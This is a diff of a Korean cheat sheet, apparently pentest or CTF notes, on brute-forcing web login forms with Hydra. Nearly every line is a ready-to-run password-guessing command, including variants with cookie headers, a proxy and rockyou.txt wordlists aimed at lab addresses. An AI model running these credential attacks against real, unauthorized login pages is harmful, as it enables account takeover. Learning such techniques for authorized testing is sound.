@@ -8,16 +8,13 @@
 
 ```bash
 # HTTP POST 로그인 폼
-hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
-  "/login.php:username=^USER^&password=^PASS^:F=로그인실패문구"
+hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=로그인실패문구"
 
 # HTTPS 로그인 폼 (443)
-hydra -l admin -P pass.txt <대상> https-post-form \
-  "/login:username=^USER^&password=^PASS^:F=failed"
+hydra -l admin -P pass.txt <대상> https-post-form "/login:username=^USER^&password=^PASS^:F=failed"
 
 # HTTPS 비표준 포트
-hydra -l admin -P pass.txt <대상> -s 8443 https-post-form \
-  "/login:username=^USER^&password=^PASS^:F=failed"
+hydra -l admin -P pass.txt <대상> -s 8443 https-post-form "/login:username=^USER^&password=^PASS^:F=failed"
 ```
 
 ## 문법 분석 (http-post-form)
@@ -65,9 +62,7 @@ username=test&password=test2&s_mod=login&s_pg=index
 조립 결과:
 
 ```bash
-hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
-  -t 16 -f 192.168.110.101 http-post-form \
-  "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong"
+hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -t 16 -f 192.168.110.101 http-post-form "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong"
 ```
 
 - `test2` 자리를 `^PASS^`로 치환하고, 고정값(hidden 필드)은 그대로 둔다
@@ -82,8 +77,7 @@ curl -s -c c.txt -o /dev/null -w "%{http_code}\n" http://<대상>/login/
 COOKIE=$(grep ISPCSESS c.txt | awk '{print $7}')
 
 # 3) H= 옵션으로 쿠키 헤더 추가
-hydra -l admin -P pass.txt -t 16 -f <대상> http-post-form \
-  "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong:H=Cookie:\ ISPCSESS=$COOKIE"
+hydra -l admin -P pass.txt -t 16 -f <대상> http-post-form "/login/index.php:username=^USER^&password=^PASS^&s_mod=login&s_pg=index:F=Username or Password wrong:H=Cookie:\ ISPCSESS=$COOKIE"
 ```
 
 - `-c c.txt`는 쿠키 저장(-b c.txt는 읽어서 요청에 실기)
@@ -92,23 +86,17 @@ hydra -l admin -P pass.txt -t 16 -f <대상> http-post-form \
 ## 실전 예시
 
 ```bash
-hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
-  "/login.php:username=^USER^&password=^PASS^:F=로그인실패문구"
+hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=로그인실패문구"
 
-hydra -L user.txt -P pass.txt 10.10.10.10 http-post-form \
-  "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -V
+hydra -L user.txt -P pass.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -V
 
-hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form \
-  "/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"
+hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form "/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"
 
-sudo hydra -l R1ckRul3s -P rockyou.txt 10.65.165.164 http-post-form \
-  "/login.php:username=^USER^&password=^PASS^&submit=Login:F=login failed"
+sudo hydra -l R1ckRul3s -P rockyou.txt 10.65.165.164 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=login failed"
 
-hydra -l molly -P rockyou.txt <MACHINE_IP> http-post-form \
-  "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+hydra -l molly -P rockyou.txt <MACHINE_IP> http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 
-hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form \
-  "/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"
+hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"
 ```
 
 ## 전부 실패할 때 체크리스트
@@ -126,8 +114,7 @@ hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form \
 ## 프록시 경유
 
 ```bash
-HYDRA_PROXY=http://192.168.199.189:3128 hydra -L users.txt -P passes.txt -s 8080 127.0.0.1 http-post-form \
-  "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
+HYDRA_PROXY=http://192.168.199.189:3128 hydra -L users.txt -P passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V
 ```
 
 ## 주의
